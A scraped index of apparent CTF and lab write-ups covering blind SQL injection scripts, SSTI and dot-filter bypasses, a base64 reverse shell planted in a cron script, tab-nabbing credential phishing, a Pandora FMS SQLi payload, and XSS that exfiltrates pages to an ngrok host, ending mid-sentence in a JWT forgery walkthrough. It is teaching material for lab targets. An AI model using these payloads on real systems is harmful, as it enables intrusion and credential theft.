OR if filters are not so restricted . same for AND we can use AANDND username=admin'/**/AANDND/**/1=1#\rand we got the wished results To make sure we have a valid Blind SQL injection we should be able to control input to trigger 2 different responses one for the True case and The False one. Trying same payload with 1=2 to be username=admin'/**/AANDND/**/1=2#\rwe will get this response , so we can control this input ! { \"Username\": \"admin'/**/AND/**/1=2#\", \"status\": \"Invalid username or password\" }\rit will be a tedious process to write the captcha each time with each request , specially blind sqli will issue a lot of requests so we need to build some sort of python script to automate this process ","date":"2022-08-06","objectID":"/posts/web-exploitation/2022-08-06-kenzy/:1:0","tags":["CTF","sql-injection"],"title":"kenzy challenge Writeup","uri":"/posts/web-exploitation/2022-08-06-kenzy/"},{"categories":["Web Exploitation"],"content":"Exploitation First we need to parse the captcha somehow , we can try issue a request to /scripts/captcha.php to see if the response contains the captcha as text. and indeed it sends the captcha base64 encoded , so we can parse it easily and get the value . import requests import base64 s = requests.Session() url = \"http://34.175.249.72:60001/scripts/captcha.php\" r = s.get(url) captcha = str(r.content).split(':')[-1].replace('\"','').replace(\"'\",'') captcha_decode = base64.b64decode(base64.b64decode(captcha)).decode('utf-8') print(captcha_decode)\rThis code will parse the captcha and get us the decoded value which we need during the login process. now we need to send another request to the login page to see the response url2 = 'http://34.175.249.72:60001/index.php' payload = f\"admin' AND 1=1#\".replace(' ','/**/').replace('AND','ANANDD') data = {'username' :payload, 'password': \"admin\" , 'captcha' : captcha_decode , 'send' :'Send' } r2 = s.post(url2 , data=data ) print(r2.text)\rassembling the 2 code snippets above we will see the exploit works as expected indeed , now we can start constructing our query to retrieve table name and the flag content. import requests import base64 from urllib.parse import quote table=\"\" counter = 1 flag = True while flag : s = requests.Session() flag = False for i in range (32,126) : url = \"http://34.175.249.72:60001/scripts/captcha.php\" r = s.get(url) captcha = str(r.content).split(':')[-1].replace('\"','').replace(\"'\",'') captcha_decode = base64.b64decode(base64.b64decode(captcha)).decode('utf-8') url2 = 'http://34.175.249.72:60001/index.php' payload = f\"admin' AND {i}=ascii(substr((SELECT table_name FROM information_schema.tables where table_schema=database() limit 1),{counter},1))#\".replace(' ','/**/').replace('AND','ANANDD') data = { 'username' :payload, 'password': \"admin\" , 'captcha' : captcha_decode , 'send' :'Send' } r2 = s.post(url2 , data=data ) print(f\"{table+chr(i)}\") if \"Treasures\" in r2.text : table +=chr(i) flag = True break counter +=1\rwe have just made 2 loops , the Flag variable is important as it will be the factor to stop the code . basically it will allow the while loop to keep iterating if we found a letter in the insider loop but if it did iterate through all characters and doesn’t found a valid one it will not loop again , it will exit. the query has 2 variables the counter and the ascii representation of the desirable letter . Running the code above we got the table name is solve . ","date":"2022-08-06","objectID":"/posts/web-exploitation/2022-08-06-kenzy/:2:0","tags":["CTF","sql-injection"],"title":"kenzy challenge Writeup","uri":"/posts/web-exploitation/2022-08-06-kenzy/"},{"categories":["Web Exploitation"],"content":"Getting the Flag will use same approach to get the flag content , we can guess the column is named flag and we can verify that by using this payload payload = \"admin' AND 'f'=substr((select column_name from information_schema.columns WHERE table_name='solve' limit 1),1,1)#\".replace(' ','/**/').replace('AND','ANANDD')\rand will find f is valid as the first character in the column_name , we can continue until we find column name is flag indeed now we can start ask for each character in our flag until we get the last character which should be } import requests import base64 from urllib.parse import quote flag= \"ASCWG{\" counter = 7 # start after ASCWG{ while not flag.endswith(\"}\") : s = requests.Session() for i in range (31,126) : url = \"http://34.175.249.72:60001/scripts/captcha.php\" r = s.get(url) captcha = str(r.content).split(':')[-1].replace('\"','').replace(\"'\",'') captcha_decode = base64.b64decode(base64.b64decode(captcha)).decode('utf-8') #print(captcha_decode) url2 = 'http://34.175.249.72:60001/index.php' payload = f\"admin' AND {i}=ascii(substr((select flag from solve limit 1),{counter},1))#\".replace(' ','/**/').replace('AND','ANANDD') data = { 'username' :payload, 'password': \"admin\" , 'captcha' : captcha_decode , 'send' :'Send' } r2 = s.post(url2 , data=data ) #print(r2.text) print(f\"{flag+chr(i)}\") if \"Treasures\" in r2.text : flag +=chr(i) break counter +=1\rRunning the script now and after some time we will get our flag eventually which is ASCWG{23fsdc$@#EAScasq12_hard}\r","date":"2022-08-06","objectID":"/posts/web-exploitation/2022-08-06-kenzy/:3:0","tags":["CTF","sql-injection"],"title":"kenzy challenge Writeup","uri":"/posts/web-exploitation/2022-08-06-kenzy/"},{"categories":["Web Exploitation"],"content":"Lexington Informatics Tournament CTF CTF 2022 was held from the 22nd of July Until the 25th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was solved less than 50 times in the 3 days and it was really nice. CTF name LITCTF 2022 challenge Flushed Emoji category web about SSTI , SQL injection description Flushed emojis are so cool!! points 250 team 0xCha0s Discovery we are given source code , so we can start from there ","date":"2022-07-25","objectID":"/posts/web-exploitation/2022-07-25-flused-emoji/:0:0","tags":["CTF","ssti","sql-injection"],"title":"Flushed Emoji challenge Writeup","uri":"/posts/web-exploitation/2022-07-25-flused-emoji/"},{"categories":["Web Exploitation"],"content":"main-server we can start checking the main-server/main.py file , let’s check the important parts : there is a login function which make sure the password doesn’t contain a dot def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if('.' in password): return render_template_string(\"lmao no way you have . in your password LOL\");\rif we have passed the dot check , our data will be sent as a post request to a remote server we don’t know its ip address if it didn’t return True our password will be processed with the render_template_string() function which is known to be a factor for SSTI exploitation r = requests.post('[Other server IP]', json={\"username\": alphanumericalOnly(username),\"password\": alphanumericalOnly(password)}); print(r.text); if(r.text == \"True\"): return render_template_string(\"OMG you are like so good at guessing our flag I am lowkey jealoussss.\"); return render_template_string(\"ok thank you for your info i have now sold your password (\" + password + \") for 2 donuts :)\"); return render_template(\"index.html\");\rAs our input doesn’t have proper filtration we can try to trigger SSTI . However most SSTI payloads contains dots , then after some searching we come across this awesome research the research discussing the possibility of evading the dots filters by using the following approach : {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}\r# to be\r{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}\rnow let’s go test the web application : Trying the above payload we have a valid SSTI exploit : now we can get a reverse shell so we can try our investigation without being concerned about dots filter. however any remote ip will have . of course. we can get around this by base64 encode our reverse shell payload then : \u003cbase64_reverse_shell\u003e | base64 -d | bash\rand we are in if you look around in the machine you won’t find any useful data , and alot of linux basic utilities are not there like nano,vi,sudo,ssh,ssh-keygen,ss,netstat,ping,wget,curl,ifconfig,ip and others our goal now is to get the IP of the remote server , we can simply search for all IPs in the machine with a simple grep regex command : grep -rE '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}' / 2\u003e/dev/null\rwe find this IP , and as we can’t get our ip address we can check the /etc/hosts so most probably the 172.24.0.8 is our next destination we can confirm that by trying to communicate with it using python3 as it was installed on the machine :\" \u003e\u003e\u003e import requests \u003e\u003e\u003e r= requests.get(\"http://172.24.0.8:8080\") \u003e\u003e\u003e print(r.text)\rif the communication party is not available an exception will be raised however it doesn’t traceback an error.(we know port 8080 from upcoming code) ","date":"2022-07-25","objectID":"/posts/web-exploitation/2022-07-25-flused-emoji/:0:1","tags":["CTF","ssti","sql-injection"],"title":"Flushed Emoji challenge Writeup","uri":"/posts/web-exploitation/2022-07-25-flused-emoji/"},{"categories":["Web Exploitation"],"content":"data-server now Let’s check the data-server/main.py code here we can see the flag is inserted into the database at the data server and if we check the rest of the code we can’t find any condition lead to make the flag be printed so keep sql injeciton in our mind con = sqlite3.connect('data.db', check_same_thread=False) app = Flask(__name__) flag = open(\"flag.txt\").read(); cur = con.cursor() cur.execute('''DROP TABLE IF EXISTS users''') cur.execute('''CREATE TABLE users (username text, password text)''') cur.execute( '''INSERT INTO users (username,password) VALUES (\"flag\",\"''' + flag + '''\") ''' )\rwe have an endpoint called /runquery which accepts JSON post data it will execute the statement without proper filters on password field we can know it will be error based SQLi from the True or False message errors @app.route('/runquery', methods=['POST']) def runquery(): request_data = request.get_json() username = request_data[\"username\"]; password = request_data[\"password\"]; print(password); cur.execute(\"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\"); rows = cur.fetchall() if(len(rows) \u003e 0): return \"True\"; return \"False\"; app.run(host='127.0.0.1',port=8080,debug=True)\rthe exploitation environment is very restricted and we doesn’t have many choices , we will build our script and run it in the python3 interactive terminal ","date":"2022-07-25","objectID":"/posts/web-exploitation/2022-07-25-flused-emoji/:0:2","tags":["CTF","ssti","sql-injection"],"title":"Flushed Emoji challenge Writeup","uri":"/posts/web-exploitation/2022-07-25-flused-emoji/"},{"categories":["Web Exploitation"],"content":"Exploitation Let’s just confirm the server returns True or False : \u003e\u003e\u003e import requests \u003e\u003e\u003e url = \"http://172.24.0.8:8080/runquery\" \u003e\u003e\u003e data={'username':'test','password':'test'} \u003e\u003e\u003e r = requests.post(url,json=data) \u003e\u003e\u003e print(r.text) False\rwe will exploit this SQL statement SELECT * FROM users WHERE username='\u003cusername\u003e' AND password='\u003cpassword\u003e'\rwe can try basic payload to alter the SQL execution : junk' OR 1=1--\rand it returns True indeed : in This CTF challenge we know the flag format so it is really helpful , we can use LIKE statement in our injection import requests,string printable = string.ascii_lowercase + string.ascii_uppercase + \"0123456789\"+ \"{}_*-+=\" flag = \"LITCTF{\" while not flag.endswith('}'): for c in printable: if \"True\" in requests.post(url = 'http://172.24.0.8:8080/runquery', json={'username': 'test','password': f'junk\\' or password like \\'{flag+c}%\\'--'}).text: flag = flag+c print(flag) break\rRunning the Exploit we can get our flag : LITCTF{flush3d_3m0ji_o_0}","date":"2022-07-25","objectID":"/posts/web-exploitation/2022-07-25-flused-emoji/:1:0","tags":["CTF","ssti","sql-injection"],"title":"Flushed Emoji challenge Writeup","uri":"/posts/web-exploitation/2022-07-25-flused-emoji/"},{"categories":["Android Pentesting"],"content":"In this Box we are going to examine an android appliacation (apk) , and monitroing the requests by placing a proxy we will notice a request which we can manipulate to get a remote code exection. this box has a lot of iptables rules which restrict us from getting a reverse shell in the usual way. so we will login via ssh by placing our public key at paul’s. from that we will gain root access by exploiting sudo itself. Scanning nmap -A -T4 $IP -oN nmap.intial\rUseful output PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) 80/tcp open http\rEnumeration visiting the web application at port 80 we can see : if we focus on the images we can see the hostname routerspace.htb However it seems it is the only host on that IP , so it was not really useful :D the only interesting thing at this page is the download option , we can download it it seems like an apk file , we need to open it so we can examine its functions. we can do that by installing anbox which can help running APK on Linux. But note that we also need to set a proxy so if any requests are issued we should be aware of it. -\u003e install anbox “works on ubuntu and not on kali” adb install RouterSpace.apk adb shell settings put global http_proxy \u003ctun0-ip\u003e:8081\rwe also need to set this setting in burpsuite now if we open anbox we should see the application clicking on the check status multiple times we can see this request issued if we forward the request we can see after trying different types of inputs (strings, numbers) it looks like it will reflect whatever data we will give it Trying some basic kind of remote code execution and we have remote coded execution indeed Foothold now we want to get a reverse shell back , we must be cautious of whatever payload we are passing because it may conflict with JSON parser and other stuff. However trying to avoid all the special character still no connection call back, as we can’t generate ssh keys for paul as this requires an interactive steps we can generate ssh pairs and place the public key inside his ~/.ssh/authorized_keys file. # @ our side ssh-keygen -f routerpsace\rwe can confirm it is placed with no issues by catting the file latter. ssh paul@routerspace.htb -i routerpsace\rand we are in Privilege Escalation After some of my checklists (sudo -l , suids , examining un unusual files, ..) . you can figure out by your own or by any automated tool that the sudo version is vulnerable to local privilege escalation sudo --version Sudo version 1.8.31 Sudoers policy plugin version 1.8.31 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.31\rand we can find exploits on github like this one here it seems there are IPTABLE rules that doesn’t permit outband communication so we can’t use curl,wget . we can use scp instead # @ our side tar cvfz exploit.tar Sudo-1.8.31-Root-Exploit scp -i routerpsace exploit.tar paul@routerspace.htb:/dev/shm/.my-file/exploit.tar\rat the machine side : tar xf exploit.tar cd Sudo-1.8.31-Root-Exploit/ make\r","date":"2022-07-09","objectID":"/posts/android-pentesting/2022-07-09-routerspace/:0:0","tags":["Hackthebox","apk","adb","sudo-exploit"],"title":"Routerspace Hackthebox writeup","uri":"/posts/android-pentesting/2022-07-09-routerspace/"},{"categories":["Android Pentesting"],"content":"pwned","date":"2022-07-09","objectID":"/posts/android-pentesting/2022-07-09-routerspace/:1:0","tags":["Hackthebox","apk","adb","sudo-exploit"],"title":"Routerspace Hackthebox writeup","uri":"/posts/android-pentesting/2022-07-09-routerspace/"},{"categories":["Linux Machines"],"content":"In This VulnHub Box, we are facing a relatively an interesting vulnerability which is tab-nabbing that will help us phish the admin to get his credentials which we can use to ssh into the Box , From There we can get a reverse shell from adrian user as he is running a cron job which is a python script and we can write into it because we are in the administrators group. and for the root part we have sudo privilege on vim editor. you can download the machine from here we have the description : Even Admins can fall asleep on the job it indicates that some admin will make a mistake or something but let’s Jump in and see ourselves. First we need to get the IP of the target machine with : sudo netdiscover\rand I have got the IP address : 192.168.1.12 Let’s start our process : ","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:0:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"Scanning nmap -A -T4 192.168.1.12 -oN nmap.inital\rresults : Host is up (0.0062s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA) | 256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA) |_ 256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Login Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rFrom the results we know the following : the target machine is Ubuntu the Apache version running 2.4.41 httponly flag not set which can lead to XSS (cross site scripting) we will get a login page when we visit the page Also we can do a full port scanning But with no more results ","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:1:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"Enumeration Before hopping into the website let’s do some basics enumeration from the terminal Directory Busting : ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://192.168.1.12/FUZZ -o files-medium.txt -fc 403\rOutput : config.php [Status: 200, Size: 0, Words: 1, Lines: 1] index.php [Status: 200, Size: 1219, Words: 334, Lines: 38] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1] welcome.php [Status: 302, Size: 0, Words: 1, Lines: 1] register.php [Status: 200, Size: 1566, Words: 434, Lines: 42] reset-password.php [Status: 302, Size: 0, Words: 1, Lines: 1]\rvisiting the web page we got a login : Trying some basic SQLi statements But no bypasses. so Let’s create an account and see what is going on . After logging in we will be redirected to /welcome.php which we have found earlier we can try to go to the /reset-password.php maybe we can change the ID or the username if it was being sent with the request to admin and reset his password. But unfortunately we can’t : we can see the Enter URL and the admin will check. i have tried some wrappers (file:// and php://) But no results , However with being said admin will review it this should trigger your XSS sense. I made an empty html file and host it , then submit the link of my URL and wait to see what will happen and Look : It seems after 2 minutes of submission the url the admin will indeed review it , so we can try to steal any useful data However i tried a lot but no thing is getting back. Let’s check the Page source code , we can see this weird target value _blank Searching for it found it is actually a vulnerability can open phishing scenarios , and we know the admin will visit this fake page , also from description we know even admin may made mistake so let’s clone the login page (copy html code) our hope is the admin to submit his username and password ","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:2:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"Foothold Following the Article steps : 1- clone the Login page source code 2- add the following in the source code which the data will be redirected to \u003cscript\u003e window.opener.location = \"http://192.168.1.11:9090\"; \u003c/script\u003e\rnote: add other port rather than the http port because it is a POST request so the data submitted will not appear at the uri in the http server 3- Host the page and submit the URL and after 2 minutes we got the Juicy stuff : now we have this credentials after URL decoding daniel:C@ughtm3napping123 Trying these credentials in the web page we got invalid login , trying them with the ssh port we have found earlier we are in finally ","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:3:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"Lateral movement First thing that have my attention is the administrators group , so let’s check what is interesting about this group daniel@napping:~$ find / -group administrators 2\u003e/dev/null /home/adrian/query.py daniel@napping:~$ ls -l /home/adrian/query.py -rw-rw-r-- 1 adrian administrators 481 Oct 30 2021 /home/adrian/query.py\rnice we have write access to that folder , we can edit it but then what ? , we need also user adrian to execute it and there should be some crontab running to achieve that. However there is no crontabs under the /etc/crontab , there are other cornjobs that are under /var/spool/cron and normally only the user who owns it will be able to access it. we can upload pspy and monitor the processes running and check for such a cron job and guess who is the User whose id is 1000 ? daniel@napping:/tmp$ cat /etc/passwd | grep adrian adrian:x:1000:1000:adrian:/home/adrian:/bin/bash\rso we can simply add our malicious piece of code in the script running by adrian and we will get a reverse shell : import os os.system(\"echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExLzg4ODggMD4mMQ== | base64 -d | bash\")\rnote we need to base64 encode the reverse shell payload as it contains some special characters will disturb the execution ","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:4:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"root Access and the root part is really easy : sudo /usr/bin/vim # press ESC then\rAnd the machine has been pwned ;) ","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:5:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"After root Under /var/spool/cron/crontabs/adrian we can see */2 * * * * /usr/bin/python3 /home/adrian/query.py\rand under /var/spool/cron/crontabs/root */2 * * * * /usr/bin/python3 /root/nap.py\rThe script was checking for the opener.location in the page the admin visit and if present it will submit the data data = { \"username\":\"daniel\", \"password\":\"C@ughtm3napping123\" } elif (search.find('opener.location') != -1): match = re.findall(\"http(.*);\",search) new_url = 'http' + match[0].rstrip(match[0][-1]) r2 = requests.post(new_url,data=data,timeout=2)","date":"2022-06-27","objectID":"/posts/linux-machines/2022-06-27-napping/:6:0","tags":["Vulnhub","tab-nabbing","phishing","vim"],"title":"napping 1.0.1 vulnhub writeup","uri":"/posts/linux-machines/2022-06-27-napping/"},{"categories":["Linux Machines"],"content":"In This Box we are going to enumerate the snmp port which will show user daniel with his password as a string in the output , we are going to login with ssh to him and will see there is another user matt which has the user.txt , after some enumeration we will see there is pandora fms running internally with user matt , we will port forward to exploit the vulnerable service then we will abuse a path poisoning in a custom binary for the root access Scanning : initial scan : nmap -sV -A -T 4 $IP -oN nmap/intial.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rAnd i have learned the lesson from previous machines so will scan udp as well just in case sudo nmap -sV -sU 10.10.11.136 PORT STATE SERVICE VERSION 161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public) 17219/udp filtered chipper 17989/udp filtered unknown 46532/udp filtered unknown\rEnumeration : port 80 : the web page : there is only this form where we can send data , parameters are : fullName=ADam\u0026email=adma@testet.com\u0026phone=a\u0026message=a\rtesting them for sqli , ssti and more found out this is just a rabbit Hole :’') we have found in the udp scan snmp is open so let’s enumerate it , trying to enumerate with the community string “public” it works and we got results : snmpwalk -c public -v1 10.10.11.136 \u003e snmpwalk.out\ryou can query about one thing with snmpwalk But i want to see all the data , finally will see this in the output iso.3.6.1.2.1.25.4.2.1.5.3068 = STRING: \"-u daniel -p HotelBabylon23\"\rso we have a potential username and a password , we can try ssh with it : ssh daniel@10.10.11.136\rFoothold : i have logged in with daniel However user matt is the one contains the user.txt and he only can read it we need to escalate to matt then root after a lot of enumeration we will see : the web page we have seen above is for the html But what about pandora ? and we will see it is owned by the user matt which we are targeting. so it seems we need to do Port forwarding to interact with this page at the Browser. # @ your side sudo ssh -N -L 0.0.0.0:9999:127.0.0.1:80 daniel@10.10.11.136\rthat will let us see this web page at http://127.0.0.1:9999 and we can see the version at the bottom of the page : v7.0NG.742_FIX_PERL2020 searching for Vulnerabilities for this version will find CVE-2021-32099 which is SQL injection in the session_id , and the payload is here and it is explained in the blog here http://127.0.0.1:9999/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:\"admin\";' as data FROM tsessions_php WHERE '1'='1\rall we need to do is to go back to http://127.0.0.1:9999/pandora_console/ and we will have admin access as the admin cookie has been added Hence the site works with PHP we can know that from wappalayzer extension, so we need to upload a php reverse shell . It is located at /usr/share/webshells/php/php-reverse-shell.php in Linux or you can download it here By watching here we need to zip it then we can execute it at /pandora_console/extensions/shell.php upload it at admin tools \u003e extensions manager \u003e extension uploader\rThen set your listener and will get the shell after execute it at /pandora_console/extensions/shell.php Once we are in we can generate ssh keys to get a stable shell kali@kali:~$ ssh-keygen -f pandora\rnormally we ’d use ssh-copy-id -i pandora.pub matt@10.10.11.136\rBut hence we don’t know matt’s password , we would copy our key manually and add it to authorized_keys at matt’s side now copy pandora.pub into authorized_keys at the target machine , you can connect now: kali@kali","date":"2022-05-21","objectID":"/posts/linux-machines/2022-05-21-pandora/:0:0","tags":["Hackthebox","snmp","port-forwarding","Path-Poisoning"],"title":"Pandora Hackthebox writeup","uri":"/posts/linux-machines/2022-05-21-pandora/"},{"categories":["Linux Machines"],"content":"pwned","date":"2022-05-21","objectID":"/posts/linux-machines/2022-05-21-pandora/:0:1","tags":["Hackthebox","snmp","port-forwarding","Path-Poisoning"],"title":"Pandora Hackthebox writeup","uri":"/posts/linux-machines/2022-05-21-pandora/"},{"categories":["Web Exploitation"],"content":"HTB Cyber Apocalypse CTF 2022 was held from the 14th of May Until the 19th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was ranked easy CTF name Cyber Apocalypse CTF 2022 challenge Kryptos Support category web about XSS , IDOR team 0xCha0s ","date":"2022-05-19","objectID":"/posts/web-exploitation/2022-05-19-kryptos-support/:0:0","tags":["CTF","XSS","IDOR"],"title":"Kryptos Support challenge Writeup","uri":"/posts/web-exploitation/2022-05-19-kryptos-support/"},{"categories":["Web Exploitation"],"content":"Discovery : This easy challenge are introduced with this page , as we see just add a report issue interface: There is also end point /login But there is no /signup or register and First thing i have tried is to get xss , i used xsshunter as a proof only latter on will use ngrok http server : \u003cscript src=https://XXXXXXX.xss.ht\u003e\u003c/script\u003e\rand we get a hit : we know from the report the following : vulnerable page http://127.0.0.1:1337/tickets/new the session used is JWT based: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI3NzEwMTh9.iQshqI16zGjE3tUOVQHsqLKaZofC8JyFN4CWhHH6lWg\rand from the DOM we can see there are other internal end points which are /settings and /logout Decoding the cookie we got the username and the uid ","date":"2022-05-19","objectID":"/posts/web-exploitation/2022-05-19-kryptos-support/:1:0","tags":["CTF","XSS","IDOR"],"title":"Kryptos Support challenge Writeup","uri":"/posts/web-exploitation/2022-05-19-kryptos-support/"},{"categories":["Web Exploitation"],"content":"Attacking : I wanted to get an overview about what functions are there in the /settings page. so we craft this payload : var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://127.0.0.1:1337/settings\"); xhr.onload = function () { var out = btoa(xhr.responseText); var exfil = new XMLHttpRequest(); exfil.open(\"GET\", \"http://3bbd-156-194-235-84.ngrok.io/?out=\" + out); exfil.send(); }; xhr.send();\rand will use this payload at the report page to request the script we host : \u003cscript src=\"http://3bbd-156-194-235-84.ngrok.io/get.js\"\u003e\u003c/script\u003e\rdecoding it : will notice the page has the update password function also , we can check the Js code under /static/js/settings.js and it is publicly exposed : $(document).ready(function() { $(\"#update-btn\").on('click', updatePassword); }); async function updatePassword() { $('#update-btn').prop('disabled', true); let card = $(\"#resp-msg\"); card.text('Updating password, please wait'); card.show(); let uid = $(\"#uid\").val(); let password1 = $(\"#password1\").val(); let password2 = $(\"#password2\").val(); if ($.trim(password1) === '' || password1 !== password2) { $('#update-btn').prop('disabled', false); card.text(\"Please type-in the same password!\"); card.show(); return; } await fetch(`/api/users/update`, { method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({password: password1, uid}), }) .then((response) =\u003e response.json() .then((resp) =\u003e { card.text(resp.message); card.show(); })) .catch((error) =\u003e { card.text(error); card.show(); }); $('#update-btn').prop('disabled', false); }\rThe catch here is that it doesn’t check the old password , just providing the uid and the new password will reset the password. we can confirm with this script which will reset the password of the moderator user var xhr = new XMLHttpRequest(); var theUrl = \"http://127.0.0.1:1337/api/users/update\"; xhr.open(\"POST\", theUrl); xhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\"); xhr.send(JSON.stringify({ password: \"testme123\", uid: \"100\" }));\rAnd we have successfully logged in with the new password and the username moderator : Now why not reset the password for the user admin too ? , as it doesn’t check on the uid , we can run intruder to fuzz the admin uid But for our luck it is 1 . from the moderator account we can reset the password without the need to use javascript code and ngrok hosting it and now we can login with the admin user ","date":"2022-05-19","objectID":"/posts/web-exploitation/2022-05-19-kryptos-support/:2:0","tags":["CTF","XSS","IDOR"],"title":"Kryptos Support challenge Writeup","uri":"/posts/web-exploitation/2022-05-19-kryptos-support/"},{"categories":["Linux Machines"],"content":"In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system. Scanning nmap -A -T5 10.10.11.126 -oN nmap/intial.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA) | 256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA) |_ 256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-generator: Hugo 0.83.1 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Hackmedia Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rand the full port scan doesn’t reveal more ports. Enumeration As we only have the web service to enumerate let’s get into it: static page doesn’t tell much , it has Login and register functions. we can try to do some authentication bypass at login But no results. so let’s create an account and login with it Once we login we have this /dashboard page : it also has an upload function we can try uploading files But doesn’t reveal any indicator where it is uploaded. so we can leave at as the 2nd option for us we can notice also the cookie we have : Seems like JWT thing we can take it and paste it into jwt.io we can see the url http://hackmedia.htb/static/jwks.json , adding the hackmedia.htb to the /etc/hosts then viewing the page : so it seems it visits this page for the verification process , searching for JWT JKU attacks found this great Article Here and it looks exactly like the situation we have. Briefly we will : 1- Generate public and private key and add them as a signature for the JWT token and change the username to admin 2- in the jwks.json modify the n value with the one we got at generation 3- modify the JKU with your host then host the jwks.json at our http server . By hosting it and make the web application visit us to verify we will login with our forged JWT. using here with the following options: using the private and public keys at the signature at jwt.io , and take the n value to modify the jwks.json we will host now modify the JKU, username and the Signature: now using that JWT as our new cookie we got this and it didn’t even make the request to our side. digging more and using dirsearch found : 308 266B http://10.10.11.126:80/dashboard -\u003e REDIRECTS TO: http://10.10.11.126/dashboard/ 308 262B http://10.10.11.126:80/display -\u003e REDIRECTS TO: http://10.10.11.126/display/ 308 258B http://10.10.11.126:80/error -\u003e REDIRECTS TO: http://10.10.11.126/error/ 308 264B http://10.10.11.126:80/internal -\u003e REDIRECTS TO: http://10.10.11.126/internal/ 308 258B http://10.10.11.126:80/login -\u003e REDIRECTS TO: http://10.10.11.126/login/ 308 262B http://10.10.11.126:80/pricing -\u003e REDIRECTS TO: http://10.10.11.126/pricing/ 308 264B http://10.10.11.126:80/redirect -\u003e REDIRECTS TO: http://10.10.11.126/redirect/ 308 264B http://10.10.11.126:80/register -\u003e REDIRECTS TO: http://10.10.11.126/register/\rand trying the following it makes the request to our side : http://10.10.11.126/redirect?url=10.10.16.39\rWe can try modifying the JKU again with : we also got : maybe it is checking for the word “static” we can try : sending the cookie finally we are in : Note :Don’t close your http server as it will request the verify with each request issued Foothold visiting the last quarter we can find it issues this request : http://10.10.11.126/display/?page=quarterly.pdf\rwe can try directory traversal But it fails , we can make use of the 